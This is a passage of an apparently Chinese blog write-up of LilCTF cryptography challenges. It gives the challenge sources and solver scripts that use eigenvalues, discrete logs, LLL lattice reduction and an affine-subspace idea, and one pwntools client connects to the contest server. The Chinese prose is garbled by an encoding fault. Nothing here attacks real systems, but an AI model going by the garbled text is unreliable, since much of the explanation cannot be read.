$\lambda_1,\lambda_2$ã€‚<br>é‚£ä¹ˆç›´æ¥æ±‚Cçš„ç‰¹å¾å€¼ä¾¿å¯ä»¥å¾—åˆ° $\lambda_1,\lambda_2$ï¼Œå†è½¬æ¢ä¸º ASCII å­—ç¬¦ä¾¿èƒ½è·å–åˆ° flagã€‚<br><strong>è§£ç­”ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br>p = <span class="hljs-number">9620154777088870694266521670168986508003314866222315790126552504304846236696183733266828489404860276326158191906907396234236947215466295418632056113826161</span><br>C = [<span class="hljs-number">7062910478232783138765983170626687981202937184255408287607971780139482616525215270216675887321965798418829038273232695370210503086491228434856538620699645</span>,<span class="hljs-number">7096268905956462643320137667780334763649635657732499491108171622164208662688609295607684620630301031789132814209784948222802930089030287484015336757787801</span>],[<span class="hljs-number">7341430053606172329602911405905754386729224669425325419124733847060694853483825396200841609125574923525535532184467150746385826443392039086079562905059808</span>,<span class="hljs-number">2557244298856087555500538499542298526800377681966907502518580724165363620170968463050152602083665991230143669519866828587671059318627542153367879596260872</span>]<br><br>C = matrix(GF(p), <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, C)<br><br>evalue = C.eigenvalues()<br><br>lambda1 = <span class="hljs-built_in">int</span>(evalue[<span class="hljs-number">0</span>])<br>lambda2 = <span class="hljs-built_in">int</span>(evalue[<span class="hljs-number">1</span>])<br><br>flag1 = long_to_bytes(lambda1)<br>flag2 = long_to_bytes(lambda2)<br><br>flag = flag1 + flag2<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;LilCTF&#123;&#123;<span class="hljs-subst">&#123;flag.decode()&#125;</span>&#125;&#125;&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="mid-math"><a href="#mid-math" class="headerlink" title="mid_math"></a>mid_math</h2><p><strong>é¢˜ç›®ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sage.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> tqdm<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randint<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad<br><br>flag = <span class="hljs-string">b&#x27;LILCTF&#123;test_flag&#125;&#x27;</span><br><br>p = getPrime(<span class="hljs-number">64</span>)<br>P = GF(p)<br><br>key = randint(<span class="hljs-number">2</span>**<span class="hljs-number">62</span>, p)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mul</span>(<span class="hljs-params">vector, c</span>):<br>    <span class="hljs-keyword">return</span> [vector[<span class="hljs-number">0</span>]*c, vector[<span class="hljs-number">1</span>]*c, vector[<span class="hljs-number">2</span>]*c, vector[<span class="hljs-number">3</span>]*c, vector[<span class="hljs-number">4</span>]*c]<br><br>v1 = [getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>)]<br>v2 = [getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>)]<br>v3 = [getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>)]<br>v4 = [getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>)]<br>v5 = [getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>)]<br>a, b, c, d, e = getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>), getPrime(<span class="hljs-number">64</span>),  <span class="hljs-number">0</span><br><br>A = matrix(P, [v1, v2, v3, v4, v5])<br>B = matrix(P, [mul(v1,a), mul(v2,b), mul(v3, c), mul(v4, d), mul(v5, e)])<br>C = A.inverse() * B<br>D = C**key<br><br>key = pad(long_to_bytes(key), <span class="hljs-number">16</span>)<br>aes = AES.new(key,AES.MODE_ECB)<br>msg = aes.encrypt(pad(flag, <span class="hljs-number">64</span>))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;p = <span class="hljs-subst">&#123;p&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;C = <span class="hljs-subst">&#123;[i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> C]&#125;</span>&#x27;</span>.replace(<span class="hljs-string">&#x27;(&#x27;</span>, <span class="hljs-string">&#x27;[&#x27;</span>).replace(<span class="hljs-string">&#x27;)&#x27;</span>, <span class="hljs-string">&#x27;]&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;D = <span class="hljs-subst">&#123;[i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> D]&#125;</span>&#x27;</span>.replace(<span class="hljs-string">&#x27;(&#x27;</span>, <span class="hljs-string">&#x27;[&#x27;</span>).replace(<span class="hljs-string">&#x27;)&#x27;</span>, <span class="hljs-string">&#x27;]&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;msg = <span class="hljs-subst">&#123;msg&#125;</span>&quot;</span>)<br><br><span class="hljs-comment">#p = 14668080038311483271</span><br><span class="hljs-comment">#C = [[11315841881544731102, 2283439871732792326, 6800685968958241983, 6426158106328779372, 9681186993951502212], [4729583429936371197, 9934441408437898498, 12454838789798706101, 1137624354220162514, 8961427323294527914], [12212265161975165517, 8264257544674837561, 10531819068765930248, 4088354401871232602, 14653951889442072670], [6045978019175462652, 11202714988272207073, 13562937263226951112, 6648446245634067896, 13902820281072641413], [1046075193917103481, 3617988773170202613, 3590111338369894405, 2646640112163975771, 5966864698750134707]]</span><br><span class="hljs-comment">#D = [[1785348659555163021, 3612773974290420260, 8587341808081935796, 4393730037042586815, 10490463205723658044], [10457678631610076741, 1645527195687648140, 13013316081830726847, 12925223531522879912, 5478687620744215372], [9878636900393157276, 13274969755872629366, 3231582918568068174, 7045188483430589163, 5126509884591016427], [4914941908205759200, 7480989013464904670, 5860406622199128154, 8016615177615097542, 13266674393818320551], [3005316032591310201, 6624508725257625760, 7972954954270186094, 5331046349070112118, 6127026494304272395]]</span><br><span class="hljs-comment">#msg = b&quot;\xcc]B:\xe8\xbc\x91\xe2\x93\xaa\x88\x17\xc4\xe5\x97\x87@\x0fd\xb5p\x81\x1e\x98,Z\xe1n`\xaf\xe0%:\xb7\x8aD\x03\xd2Wu5\xcd\xc4#m&#x27;\xa7\xa4\x80\x0b\xf7\xda8\x1b\x82k#\xc1gP\xbd/\xb5j&quot;</span><br></code></pre></td></tr></table></figure><p><strong>åˆ†æï¼š</strong><br>æœ¬é¢˜å’Œä¸Šè¾¹é¢˜ç›®è¿˜æ˜¯æ¯”è¾ƒç›¸ä¼¼çš„ï¼Œåªæ˜¯å¤šäº†ä¸€æ­¥æ±‚è§£ç¦»æ•£å¯¹æ•°é—®é¢˜ã€‚<br>æ ¹æ®åˆ†æï¼Œå¯ä»¥å‘ç°çŸ©é˜µ C ç›¸ä¼¼äºä¸€ä¸ªå¯¹è§’çŸ©é˜µï¼š<br>$$<br>\begin{bmatrix}<br>a &amp; 0 &amp; 0 &amp; 0 &amp; 0 \newline<br>0 &amp; b &amp; 0 &amp; 0 &amp; 0 \newline<br>0 &amp; 0 &amp; c &amp; 0 &amp; 0 \newline<br>0 &amp; 0 &amp; 0 &amp; d &amp; 0 \newline<br>0 &amp; 0 &amp; 0 &amp; 0 &amp; 0<br>\end{bmatrix}<br>$$<br>å…¶ç‰¹å¾å€¼ä¸º $a,b,c,d,0$ é‚£ä¹ˆç”±$D &#x3D; C^{key}$ï¼Œåˆ™ D å¯¹åº”çš„ç‰¹å¾å€¼ä¸º $a^{key},b^{key},c^{key},d^{key},0 \mod p$<br>åœ¨æ±‚å‡ºç‰¹å¾å€¼åï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥é€šè¿‡æ±‚è§£ç¦»æ•£å¯¹æ•°é—®é¢˜è·å– keyã€‚<br>ä¹‹åä¾¿å¯ä»¥è·å–flag<br><strong>è§£ç­”ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> unpad, pad<br><br>p = <span class="hljs-number">14668080038311483271</span><br>C_list = [[<span class="hljs-number">11315841881544731102</span>, <span class="hljs-number">2283439871732792326</span>, <span class="hljs-number">6800685968958241983</span>, <span class="hljs-number">6426158106328779372</span>, <span class="hljs-number">9681186993951502212</span>],<br>          [<span class="hljs-number">4729583429936371197</span>, <span class="hljs-number">9934441408437898498</span>, <span class="hljs-number">12454838789798706101</span>, <span class="hljs-number">1137624354220162514</span>, <span class="hljs-number">8961427323294527914</span>],<br>          [<span class="hljs-number">12212265161975165517</span>, <span class="hljs-number">8264257544674837561</span>, <span class="hljs-number">10531819068765930248</span>, <span class="hljs-number">4088354401871232602</span>, <span class="hljs-number">14653951889442072670</span>],<br>          [<span class="hljs-number">6045978019175462652</span>, <span class="hljs-number">11202714988272207073</span>, <span class="hljs-number">13562937263226951112</span>, <span class="hljs-number">6648446245634067896</span>, <span class="hljs-number">13902820281072641413</span>],<br>          [<span class="hljs-number">1046075193917103481</span>, <span class="hljs-number">3617988773170202613</span>, <span class="hljs-number">3590111338369894405</span>, <span class="hljs-number">2646640112163975771</span>, <span class="hljs-number">5966864698750134707</span>]]<br>D_list = [[<span class="hljs-number">1785348659555163021</span>, <span class="hljs-number">3612773974290420260</span>, <span class="hljs-number">8587341808081935796</span>, <span class="hljs-number">4393730037042586815</span>, <span class="hljs-number">10490463205723658044</span>],<br>          [<span class="hljs-number">10457678631610076741</span>, <span class="hljs-number">1645527195687648140</span>, <span class="hljs-number">13013316081830726847</span>, <span class="hljs-number">12925223531522879912</span>, <span class="hljs-number">5478687620744215372</span>],<br>          [<span class="hljs-number">9878636900393157276</span>, <span class="hljs-number">13274969755872629366</span>, <span class="hljs-number">3231582918568068174</span>, <span class="hljs-number">7045188483430589163</span>, <span class="hljs-number">5126509884591016427</span>],<br>          [<span class="hljs-number">4914941908205759200</span>, <span class="hljs-number">7480989013464904670</span>, <span class="hljs-number">5860406622199128154</span>, <span class="hljs-number">8016615177615097542</span>, <span class="hljs-number">13266674393818320551</span>],<br>          [<span class="hljs-number">3005316032591310201</span>, <span class="hljs-number">6624508725257625760</span>, <span class="hljs-number">7972954954270186094</span>, <span class="hljs-number">5331046349070112118</span>, <span class="hljs-number">6127026494304272395</span>]]<br>msg = <span class="hljs-string">b&quot;\xcc]B:\xe8\xbc\x91\xe2\x93\xaa\x88\x17\xc4\xe5\x97\x87@\x0fd\xb5p\x81\x1e\x98,Z\xe1n`\xaf\xe0%:\xb7\x8aD\x03\xd2Wu5\xcd\xc4#m&#x27;\xa7\xa4\x80\x0b\xf7\xda8\x1b\x82k#\xc1gP\xbd/\xb5j&quot;</span><br><br>Fp = GF(p)<br>C_mat = matrix(Fp, C_list)<br>D_mat = matrix(Fp, D_list)<br><br><span class="hljs-comment">#è®¡ç®— C å’Œ D çš„ç‰¹å¾å€¼</span><br>eval_C = C_mat.eigenvalues()<br>eval_D = D_mat.eigenvalues()<br><br><span class="hljs-comment">#å»æ‰0ç‰¹å¾å€¼</span><br>eval_C_nonzero = [x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> eval_C <span class="hljs-keyword">if</span> x != <span class="hljs-number">0</span>]<br>eval_D_nonzero = [x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> eval_D <span class="hljs-keyword">if</span> x != <span class="hljs-number">0</span>]<br><br><span class="hljs-comment">#è¾“å‡ºç‰¹å¾å€¼</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Nonzero eigenvalues of C:&quot;</span>, eval_C_nonzero)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Nonzero eigenvalues of D:&quot;</span>, eval_D_nonzero)<br><br><span class="hljs-comment">#å°è¯•è®¡ç®—ç¦»æ•£å¯¹æ•°ä»¥æ‰¾åˆ°key</span><br>key = <span class="hljs-literal">None</span><br><span class="hljs-keyword">for</span> mu <span class="hljs-keyword">in</span> eval_D_nonzero:<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment">#å°è¯•è®¡ç®—ç¬¬ä¸€ä¸ªéé›¶ç‰¹å¾å€¼å¯¹åº”çš„kå€¼</span><br>        k = discrete_log(mu, eval_C_nonzero[<span class="hljs-number">0</span>])<br>        <span class="hljs-comment">#æ£€æŸ¥kæ˜¯å¦æ»¡è¶³æ¡ä»¶</span><br>        valid = <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">for</span> lam <span class="hljs-keyword">in</span> eval_C_nonzero:<br>            <span class="hljs-keyword">if</span> lam^k <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> eval_D_nonzero:<br>                valid = <span class="hljs-literal">False</span><br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> valid:<br>            key = k<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Found key: <span class="hljs-subst">&#123;key&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Error: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">continue</span><br><br><span class="hljs-keyword">if</span> key <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;Key not found&quot;</span>)<br><br>key_bytes = pad(long_to_bytes(key), <span class="hljs-number">16</span>)<br>aes = AES.new(key_bytes, AES.MODE_ECB)<br>flag = unpad(aes.decrypt(msg), <span class="hljs-number">64</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Flag:&quot;</span>, flag)<br></code></pre></td></tr></table></figure><h2 id="Linear"><a href="#Linear" class="headerlink" title="Linear"></a>Linear</h2><p><strong>é¢˜ç›®ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> signal<br><br>signal.alarm(<span class="hljs-number">10</span>)<br><br>flag = os.getenv(<span class="hljs-string">&quot;LILCTF_FLAG&quot;</span>, <span class="hljs-string">&quot;LILCTF&#123;default&#125;&quot;</span>)<br><br>nrows = <span class="hljs-number">16</span><br>ncols = <span class="hljs-number">32</span><br><br>A = [[random.randint(<span class="hljs-number">1</span>, <span class="hljs-number">1919810</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(ncols)] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(nrows)]<br>x = [random.randint(<span class="hljs-number">1</span>, <span class="hljs-number">114514</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(ncols)]<br><br>b = [<span class="hljs-built_in">sum</span>(A[i][j] * x[j] <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(ncols)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(nrows)]<br><span class="hljs-built_in">print</span>(A)<br><span class="hljs-built_in">print</span>(b)<br><br>xx = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>, <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Enter your solution: &quot;</span>).strip().split()))<br><span class="hljs-keyword">if</span> xx != x:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Oh, your linear algebra needs to be practiced.&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Bravo! Here is your flag:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p><strong>åˆ†æï¼š</strong><br>å·²çŸ¥æœ‰<br>$$<br>A\vec{x} &#x3D; \vec{b}<br>$$<br>è®¾ $y&#x3D;[x_1,x_2,,,x_n,1]$ å¯ä»¥è½¬æ¢ä¸º<br>$$<br>\begin{bmatrix}<br>A \newline<br>-\vec{b}<br>\end{bmatrix}<br>*y&#x3D;0<br>$$<br>è¯´æ˜ y å­˜åœ¨äºè¯¥å¢å¹¿çŸ©é˜µçš„å³æ ¸ç©ºé—´ä¸­ï¼Œç”±äº $\vec{x}$ ä¸­éƒ½æ˜¯æ•´æ•°ï¼Œè€Œä¸”éƒ½æ˜¯æ¯”è¾ƒå°çš„æ•°ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨ LLL åœ¨å€™é€‰çš„ y ä¸­è§„çº¦å‡ºæœ€çŸ­å‘é‡<br><strong>è§£ç­”ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sage.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> ast<br><br>HOST,PORT = <span class="hljs-string">&quot;gz.imxbt.cn&quot;</span> , <span class="hljs-number">20786</span><br>io = remote(HOST, PORT)<br><br>nrows = <span class="hljs-number">16</span><br>ncols = <span class="hljs-number">32</span><br><br>AA = io.recvline()<br>bb = io.recvline()<br><br><span class="hljs-comment">#å°†æ¥æ”¶çš„å­—ç¬¦ä¸²è½¬æ¢ä¸ºåˆ—è¡¨</span><br>A = Matrix(ZZ, <span class="hljs-built_in">eval</span>(AA))<br>b = vector(ZZ, <span class="hljs-built_in">eval</span>(bb))<br><br><span class="hljs-comment">#åˆ›å»ºå¢å¹¿çŸ©é˜µ</span><br>M = A.augment(-b)<br><span class="hljs-comment">#è®¡ç®—å³æ ¸</span><br>y_cands = M.right_kernel().basis_matrix()<br>L = y_cands.LLL()<br>y = <span class="hljs-built_in">tuple</span>(<span class="hljs-built_in">abs</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> L[<span class="hljs-number">0</span>][:-<span class="hljs-number">1</span>])<br><br>x = <span class="hljs-string">&quot; &quot;</span>.join(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">str</span>, y))<br><br>io.sendlineafter(<span class="hljs-string">b&quot;Enter your solution: &quot;</span>, x.encode())<br><span class="hljs-built_in">print</span>(io.recvall().decode())<br>io.close()<br></code></pre></td></tr></table></figure><h2 id="Space-Travel"><a href="#Space-Travel" class="headerlink" title="Space Travel"></a>Space Travel</h2><p><strong>é¢˜ç›®ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><span class="hljs-keyword">from</span> params <span class="hljs-keyword">import</span> vecs<br><span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> urandom<br>key = <span class="hljs-built_in">int</span>(<span class="hljs-string">&quot;&quot;</span>.join([vecs[<span class="hljs-built_in">int</span>.from_bytes(urandom(<span class="hljs-number">2</span>)) &amp; <span class="hljs-number">0xfff</span>] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>)]), <span class="hljs-number">2</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ğŸ :&quot;</span>, [[nonce := <span class="hljs-built_in">int</span>(urandom(<span class="hljs-number">50</span>*<span class="hljs-number">2</span>).<span class="hljs-built_in">hex</span>(), <span class="hljs-number">16</span>), (<span class="hljs-built_in">bin</span>(nonce &amp; key).count(<span class="hljs-string">&quot;1&quot;</span>)) % <span class="hljs-number">2</span>] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">600</span>)])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ğŸš© :&quot;</span>, AES.new(key=md5(<span class="hljs-built_in">str</span>(key).encode()).digest(), nonce=<span class="hljs-string">b&quot;Tiffany&quot;</span>, mode=AES.MODE_CTR).encrypt(<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>).read()))<br></code></pre></td></tr></table></figure><p><strong>è€ƒç‚¹ï¼š</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">ä»¿å°„å­ç©ºé—´<br></code></pre></td></tr></table></figure><p><strong>åˆ†æï¼š</strong><br>è¿™é¢˜æ˜¯é¸¡å—å¸ˆå‚…å‡ºçš„é¢˜ï¼Œè™½ç„¶ç®€çŸ­ï¼Œä½†ååˆ†æœ‰æ„æ€ï¼Œç”±äºæˆ‘æœ€è¿‘äº‹æƒ…æœ‰ç‚¹å¤šï¼Œä¸ºäº†å¿«ç‚¹æŠŠå‰è¾¹çš„ç¼ºçš„é¢˜ç›®çœ‹å®Œï¼Œå› æ­¤è¿™é‡Œä¹Ÿæ˜¯æ‡’å¾—å†™è„šæœ¬äº†ï¼Œç›´æ¥å°†æƒ³æ³•å‘Šè¯‰ ai å°±èƒ½ç›´æ¥å‡ºï¼ˆå¤ªç½ªæ¶äº†ï¼Œä»¥åä¸€å®šä¼šå¥½å¥½å†™è„šæœ¬çš„å‘œå‘œå‘œã€‚ã€‚<br>é‚£ä¹ˆå°±è¿›å…¥æ­£é¢˜å§ï¼Œè¿™é¢˜çœ‹å¾—å‡ºæ¥æ˜¯åœ¨è€ƒå¯Ÿçº¿æ€§ä»£æ•°ï¼Œæ•´ä¸ªåŠ å¯†é€»è¾‘å¯ä»¥ç†è§£ä¸ºåœ¨ $GF(2)$ä¸‹ï¼š</p><p>$$<br>A_{600\times 800}key_{800\times 1} &#x3D; b_{800\times 1}<br>$$</p><p>å¯ä»¥çœ‹å‡ºï¼Œå¦‚æœæŠŠä¸Šå¼å½“ä½œçº¿æ€§æ–¹ç¨‹ç»„æ±‚è§£çš„è¯ï¼Œkey ä¸­æœªçŸ¥çš„ä½æ•°æœ‰ 800 bitsï¼Œè€Œæˆ‘ä»¬æ€»å…±æœ‰600ä¸ªæ–¹ç¨‹ç»„ï¼Œå› æ­¤è¯¥æ–¹ç¨‹ç»„æ˜¯æ¬ å®šçš„ï¼Œæˆ‘ä»¬ç›´æ¥æ±‚è§£çš„è¯ï¼Œä¼šå­˜åœ¨ 200 bits çš„è§£ç©ºé—´ï¼Œé€šå¸¸åœ¨æ²¡æœ‰ä¼˜åŒ–æ–¹æ³•çš„æƒ…å†µä¸‹é«˜äº 30 bits æˆ‘ä»¬å°±ä¸è€ƒè™‘çˆ†ç ´äº†ï¼Œå› æ­¤è§£é¢˜çš„å…³é”®ä¸åœ¨äºæ­¤ã€‚<br>å†è§‚å¯Ÿç»™å‡ºçš„é™„ä»¶ï¼Œæˆ‘ä»¬ä¼šå‘ç°æœ‰ä¸ªé™„ä»¶æˆ‘ä»¬ä¼¼ä¹è¿˜æ²¡ç”¨ä¸Šï¼Œé‚£å°±æ˜¯ params.pyï¼Œå®ƒç»™å‡ºäº†ç”¨æ¥ç”Ÿæˆ key çš„åˆ—è¡¨ vecsï¼Œæˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹åˆ—è¡¨é•¿åº¦ä¼šå‘ç°ï¼Œåˆ—è¡¨é•¿åº¦å¹¶ä¸æ˜¯æˆ‘ä»¬ä¸‹æ„è¯†ä»¥ä¸ºçš„ 65536ï¼ˆ$2^{16}$ï¼‰ï¼Œè€Œæ˜¯ 4096ï¼ˆ$2^{12}$ï¼‰ï¼Œè²Œä¼¼å‘ç°äº†å…³é”®æ‰€åœ¨ã€‚<br>è¯¢é—® ai åï¼Œai çŒœæµ‹å­˜åœ¨ä»¿å°„å­ç©ºé—´ï¼Œä»”ç»†ä¸€æƒ³ï¼Œç¡®å®å¦‚æ­¤å•Šï¼ˆå› ä¸º vecs ä¸­ä¸å­˜åœ¨å­å‘é‡ï¼Œè¯´æ˜å®ƒä¸æ˜¯çº¿æ€§å­ç©ºé—´ï¼‰ï¼Œkey å¹¶ä¸æ˜¯åœ¨ 16 ç»´å‘é‡ç©ºé—´ä¸­ç”Ÿæˆçš„ï¼Œè€Œæ˜¯åœ¨ 12 